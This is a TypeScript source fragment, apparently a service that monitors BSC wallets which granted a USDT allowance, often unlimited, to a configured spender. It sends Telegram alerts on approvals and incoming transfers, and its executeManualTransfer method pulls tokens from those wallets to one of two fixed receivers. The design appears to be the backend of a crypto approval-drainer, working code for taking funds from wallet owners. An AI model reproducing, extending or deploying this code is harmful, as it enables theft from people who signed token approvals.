          "☑ <b>STATUS: TRANSFER VERIFIED</b>"
        ].join("\n") : "";

    try {
      try {
        const response = await fetch(`https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: config.TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
          signal: AbortSignal.timeout(TELEGRAM_REQUEST_TIMEOUT_MS)
        });
        const responseText = await response.text();
        let data: {
          ok?: boolean;
          description?: string;
          result?: { message_id?: number; chat?: { id?: number | string } };
        };
        try {
          data = JSON.parse(responseText) as { ok?: boolean; description?: string };
        } catch {
          throw new Error(`Telegram API returned HTTP ${response.status} with a non-JSON response`);
        }
        if (!response.ok || data.ok !== true) {
          throw new Error(
            `Telegram API returned HTTP ${response.status}: ${data.description ?? "Request rejected"}`
          );
        }
        if (
          typeof data.result?.message_id !== "number" ||
          !Number.isInteger(data.result.message_id) ||
          data.result.message_id <= 0 ||
          data.result.chat?.id === undefined
        ) {
          throw new Error(`Telegram API returned HTTP ${response.status} with an invalid successful response`);
        }
        if (
          /^-?\d+$/.test(config.TELEGRAM_CHAT_ID) &&
          String(data.result.chat.id) !== config.TELEGRAM_CHAT_ID
        ) {
          throw new Error(`Telegram API returned HTTP ${response.status}: response chat ID did not match configured chat ID`);
        }
        const sentAt = new Date().toISOString();
        this.successfulTelegramNotifications.set(deliveryKey, sentAt);
        current.telegramStatus = "sent";
        current.telegramSentAt = sentAt;
        current.telegramError = undefined;
      } catch (error) {
        const safeError = sanitizeTelegramError(error, config.TELEGRAM_BOT_TOKEN);
        current.telegramStatus = "failed";
        current.telegramError = safeError;
        console.error(
          `[Telegram] ${type} notification ${current.id} failed on attempt ${attempted}: ${safeError}`
        );
      }
      current.telegramAttemptCount = attempted;
      current.updatedAt = new Date().toISOString();

      let deliveryStatusPersisted = false;
      try {
        if (type === "Approval") {
          await this.store.upsertApproval(current as ApprovalRecord);
        } else {
          await this.store.upsertTransfer(current as TransferRecord);
        }
        deliveryStatusPersisted = true;
      } catch (error) {
        console.error(`[Telegram] Could not persist ${type.toLowerCase()} delivery status for ${current.id}:`, error);
      }
      if (deliveryStatusPersisted && current.telegramStatus === "sent") {
        this.successfulTelegramNotifications.delete(deliveryKey);
      }
    } finally {
      this.telegramNotificationsInFlight.delete(deliveryKey);
    }
  }

  private async sendIncomingTransferNotification(record: IncomingTransferRecord) {
    const approval = this.store.findActiveApprovalAt(
      record.walletAddress,
      record.blockNumber,
      record.logIndex
    );
    if (
      record.eventType !== "IncomingTransfer" ||
      record.tokenContract.toLowerCase() !== config.USDT_ADDRESS.toLowerCase() ||
      record.spender.toLowerCase() !== config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() ||
      record.chainId !== String(config.CHAIN_ID) ||
      !approval ||
      approval.id !== record.approvalRecordId
    ) {
      console.error(`[Telegram] Refusing out-of-scope incoming transfer notification ${record.id}`);
      return;
    }

    if (record.telegramStatus === "sent") return;

    const [latestBlock, canonicalBlock] = await Promise.all([
      this.provider.getBlockNumber(),
      this.provider.getBlock(record.blockNumber)
    ]);
    if (!canonicalBlock?.hash) return;
    if (canonicalBlock.hash.toLowerCase() !== record.blockHash.toLowerCase()) {
      await this.store.updateIncomingCanonicalStatus(record.id, "reorged");
      console.warn(`[Monitor] Deferring Telegram notification for reorged incoming transfer ${record.id}`);
      return;
    }

    const confirmationState = incomingTransferConfirmationState(record, latestBlock, canonicalBlock.hash);
    if (!confirmationState) return;
    const confirmedRecord: IncomingTransferRecord = {
      ...record,
      confirmations: confirmationState.confirmations,
      confirmationStatus: confirmationState.confirmationStatus,
      updatedAt: new Date().toISOString()
    };
    if (
      confirmedRecord.confirmations !== record.confirmations ||
      confirmedRecord.confirmationStatus !== record.confirmationStatus
    ) await this.store.upsertIncomingTransfer(confirmedRecord);
    if (!confirmationState.eligible) return;

    if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_CHAT_ID) {
      confirmedRecord.telegramStatus = "skipped";
      confirmedRecord.updatedAt = new Date().toISOString();
      await this.store.upsertIncomingTransfer(confirmedRecord);
      return;
    }

    const deliveryKey = `${confirmedRecord.chainId}:${confirmedRecord.transactionHash.toLowerCase()}:${confirmedRecord.logIndex}:IncomingTransfer`;
    if (this.telegramNotificationsInFlight.has(deliveryKey)) return;
    this.telegramNotificationsInFlight.add(deliveryKey);
    try {
      const claim = await this.store.claimIncomingTelegramNotification(
        confirmedRecord.id,
        TELEGRAM_DELIVERY_LEASE_MS
      );
      if (!claim) return;
      if (claim.status === "sent") {
        confirmedRecord.telegramStatus = "sent";
        confirmedRecord.telegramSentAt = claim.sentAt;
        confirmedRecord.telegramError = undefined;
        confirmedRecord.updatedAt = new Date().toISOString();
        await this.store.upsertIncomingTransfer(confirmedRecord);
        return;
      }

      const attempted: IncomingTransferRecord = {
        ...confirmedRecord,
        telegramStatus: "sending",
        telegramAttemptCount: confirmedRecord.telegramAttemptCount + 1,
        telegramError: undefined,
        updatedAt: new Date().toISOString()
      };
      await this.store.upsertIncomingTransfer(attempted);

      const code = (value: string) => `<code>${escapeHtml(value)}</code>`;
      const link = (url: string, value: string) => `<a href="${url}">${code(value)}</a>`;
      const walletLink = (value: string) =>
        link(`https://bscscan.com/address/${encodeURIComponent(value)}`, value);
      const transactionLink = (value: string) =>
        link(`https://bscscan.com/tx/${encodeURIComponent(value)}`, value);
      const allowance = BigInt(confirmedRecord.rawApprovedAllowance) === MAX_UINT256
        ? "Unlimited"
        : `${escapeHtml(formatRawAmount(confirmedRecord.rawApprovedAllowance, confirmedRecord.tokenDecimals))} USDT`;
      const previousBalance = confirmedRecord.rawBalanceBefore === undefined
        ? "Unavailable"
        : `${escapeHtml(formatRawAmount(confirmedRecord.rawBalanceBefore, confirmedRecord.tokenDecimals))} USDT`;
      const updatedBalance = confirmedRecord.rawBalanceAfter === undefined
        ? "Unavailable"
        : `${escapeHtml(formatRawAmount(confirmedRecord.rawBalanceAfter, confirmedRecord.tokenDecimals))} USDT`;
      const confirmationStatus = `${confirmedRecord.confirmationStatus} (${confirmedRecord.confirmations} confirmation${confirmedRecord.confirmations === 1 ? "" : "s"})`;
      const message = [
        "<b>📥 INCOMING USDT TRANSFER</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        `👛 Wallet: ${walletLink(confirmedRecord.walletAddress)}`,
        `🕒 Original approval time (UTC): ${escapeHtml(formatTimestamp(confirmedRecord.approvalBlockTimestamp))}`,
        `🎯 Approved spender: ${walletLink(confirmedRecord.spender)}`,
        `🔐 Approved allowance: ${allowance}`,
        "━━━━━━━━━━━━━━━━━━━━",
        `📤 Sender: ${walletLink(confirmedRecord.sender)}`,
        `💰 Incoming amount: ${escapeHtml(formatRawAmount(confirmedRecord.rawReceivedAmount, confirmedRecord.tokenDecimals))} USDT`,
        `⬅️ Previous USDT balance: ${previousBalance}`,
        `➡️ Updated USDT balance: ${updatedBalance}`,
        `📊 Balance data: ${formatStatus(confirmedRecord.balanceStatus)}`,
        "━━━━━━━━━━━━━━━━━━━━",
        `🗓 Transaction time (UTC): ${confirmedRecord.blockTimestampStatus === "verified" ? escapeHtml(formatTimestamp(confirmedRecord.blockTimestamp)) : "Unavailable"}`,
        `🔗 Transaction hash: ${transactionLink(confirmedRecord.transactionHash)}`,
        `📦 Block: ${escapeHtml(String(confirmedRecord.blockNumber))}`,
        `☑ Confirmation status: ${escapeHtml(confirmationStatus)}`
      ].join("\n");

      let deliveryStatus: "failed" | "sent" = "failed";
      let sentAt: string | undefined;
      let deliveryError: string | undefined;
      try {
        const response = await fetch(
          `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify({
              chat_id: config.TELEGRAM_CHAT_ID,
              text: message,
              parse_mode: "HTML",
              disable_web_page_preview: true
            }),
            signal: AbortSignal.timeout(TELEGRAM_REQUEST_TIMEOUT_MS)
          }
        );
        const responseText = await response.text();
        let data: {
          ok?: boolean;
          description?: string;
          result?: { message_id?: number; chat?: { id?: number | string } };
        };
        try {
          data = JSON.parse(responseText) as {
            ok?: boolean;
            description?: string;
            result?: { message_id?: number; chat?: { id?: number | string } };
          };
        } catch {
          throw new Error(`Telegram API returned HTTP ${response.status} with a non-JSON response`);
        }
        if (!response.ok || data.ok !== true) {
          throw new Error(`Telegram API returned HTTP ${response.status}: ${data.description ?? "Request rejected"}`);
        }
        if (
          typeof data.result?.message_id !== "number" ||
          !Number.isInteger(data.result.message_id) ||
          data.result.message_id <= 0 ||
          data.result.chat?.id === undefined
        ) {
          throw new Error(`Telegram API returned HTTP ${response.status} with an invalid successful response`);
        }
        if (
          /^-?\d+$/.test(config.TELEGRAM_CHAT_ID) &&
          String(data.result.chat.id) !== config.TELEGRAM_CHAT_ID
        ) {
          throw new Error(`Telegram API returned HTTP ${response.status}: response chat ID did not match configured chat ID`);
        }
        deliveryStatus = "sent";
        sentAt = new Date().toISOString();
        attempted.telegramStatus = "sent";
        attempted.telegramSentAt = sentAt;
        attempted.telegramError = undefined;
      } catch (error) {
        deliveryError = sanitizeTelegramError(error, config.TELEGRAM_BOT_TOKEN);
        attempted.telegramStatus = "failed";
        attempted.telegramError = deliveryError;
        console.error(
          `[Telegram] Incoming transfer notification ${confirmedRecord.id} has an uncertain delivery result; retry will use the delivery lease: ${deliveryError}`
        );
      }

      attempted.updatedAt = new Date().toISOString();
      let eventStatusPersisted = false;
      try {
        await this.store.upsertIncomingTransfer(attempted);
        eventStatusPersisted = true;
      } catch (error) {
        console.error(
          `[Telegram] Could not persist incoming transfer delivery status for ${confirmedRecord.id}:`,
          error
        );
      }
      const deliveryStatusPersisted = await this.store.finishIncomingTelegramNotification(
        confirmedRecord.id,
        claim.leaseToken,
        deliveryStatus,
        { sentAt, error: deliveryError },
        TELEGRAM_DELIVERY_LEASE_MS
      );
      if (!deliveryStatusPersisted) {
        console.error(`[Telegram] Incoming transfer delivery lease was lost before completion for ${confirmedRecord.id}`);
      }
      if (!eventStatusPersisted && deliveryStatus === "sent") {
        console.error(`[Telegram] Telegram accepted incoming transfer ${confirmedRecord.id}, but its event status needs recovery`);
      }
    } finally {
      this.telegramNotificationsInFlight.delete(deliveryKey);
    }
  }

  async executeManualTransfer(address: string, receiver: 1 | 2, requestedAmount: string) {
    const wallet = this.store.getWallet(address);
    const approvalLinkedWallet = this.store.listApprovalLinkedWallets()
      .some((item) => item.address.toLowerCase() === address.toLowerCase());
    if (!wallet?.active || !approvalLinkedWallet) {
      throw new ManualTransferError("Wallet is not active for monitored transfers", 404);
    }
    if (!this.contract || !this.signer) {
      throw new ManualTransferError("Manual transfers are not configured", 503);
    }

    const decimals = Number(await this.token.decimals());
    let amount: bigint;
    try {
      amount = ethers.parseUnits(requestedAmount, decimals);
    } catch {
      throw new ManualTransferError(`Enter a valid amount with no more than ${decimals} decimal places`, 400);
    }
    if (amount <= 0n) throw new ManualTransferError("Transfer amount must be greater than zero", 400);

    const record = await this.store.addHistory({
      id: crypto.randomUUID(),
      wallet: wallet.address,
      receiver,
      amount: amount.toString(),
      status: "submitted",
      createdAt: new Date().toISOString()
    });

    const method = receiver === 1 ? "executeToReceiver1" : "executeToReceiver2";
    let transaction: ethers.TransactionResponse;
    try {
      transaction = await this.contract[method](wallet.address, amount);
    } catch (error) {
      record.status = "failed";
      record.error = error instanceof Error ? error.message : String(error);
      return this.store.addHistory(record);
    }

    record.txHash = transaction.hash;
    await this.store.addHistory(record);
    try {
      await transaction.wait();
    } catch (error) {
      record.status = "failed";
      record.error = error instanceof Error ? error.message : String(error);
      return this.store.addHistory(record);
    }

    record.status = "confirmed";
    await this.store.addHistory(record);
    await this.store.incrementLifetimeTransferredAmount(record.id, record.amount);
    return record;
  }
}
